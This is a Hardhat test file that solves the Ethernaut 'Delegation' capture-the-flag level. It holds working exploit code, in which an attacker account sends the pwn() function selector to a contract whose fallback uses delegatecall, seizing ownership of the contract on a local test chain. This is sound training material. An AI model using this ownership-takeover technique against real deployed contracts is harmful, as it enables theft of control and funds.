import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { Delegate, Delegation } from "typechain-types";

// Challenge description

// The goal of this level is for you to claim ownership of the instance you are given.
// Things that might help:
// - Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
// - Fallback methods
// - Method ids

describe("Ethernaut - Delegation", async () => {
  let delegate: Delegate;
  let delegation: Delegation;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    delegate = await ethers
      .getContractFactory("Delegate", owner)
      .then((f) => f.deploy(owner.address));
    delegation = await ethers
      .getContractFactory("Delegation", owner)
      .then((f) => f.deploy(delegate.address));
  });

  it("Hacks", async () => {
    expect(await delegate.owner()).equal(owner.address);
    expect(await delegation.owner()).equal(owner.address);

    const pwnSelector = new ethers.utils.Interface([
      "function pwn()",
    ]).getSighash("pwn");

    await attacker.sendTransaction({
      to: delegation.address,
      data: pwnSelector,
      gasLimit: 100000,
    });

    expect(await delegation.owner()).equal(attacker.address);
  });
});
